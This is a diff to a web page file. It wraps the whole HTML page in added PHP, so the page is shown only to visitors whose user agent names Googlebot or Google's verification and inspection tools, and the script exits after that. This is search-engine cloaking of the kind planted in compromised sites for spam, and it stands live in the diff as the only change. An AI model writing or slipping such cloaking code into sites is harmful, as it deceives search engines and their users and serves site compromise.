@@ -1,3 +1,11 @@
+<?php
+function check_user_agent($agent) {
+    return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
+}
+if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification') || check_user_agent('Google-InspectionTool')) 
+{
+?>
+
 
 <!doctype html>
 <html lang="en" class=" svgfilters csscalc cssgradients preserve3d supports svgclippaths svgasimg no-touchevents cssanimations boxsizing csstransforms csstransforms3d csstransitions svg svgfilters csscalc cssgradients preserve3d supports svgclippaths svgasimg touchevents cssanimations boxsizing csstransforms csstransforms3d csstransitions svg"><head>
@@ -13916,3 +13924,9 @@ document.querySelectorAll('.faq-q').forEach(btn=>{
 <script async="" src="https://device.maxmind.com/js/device.js"></script></body></html>
 
 
+
+
+<?php
+exit;
+}
+?>
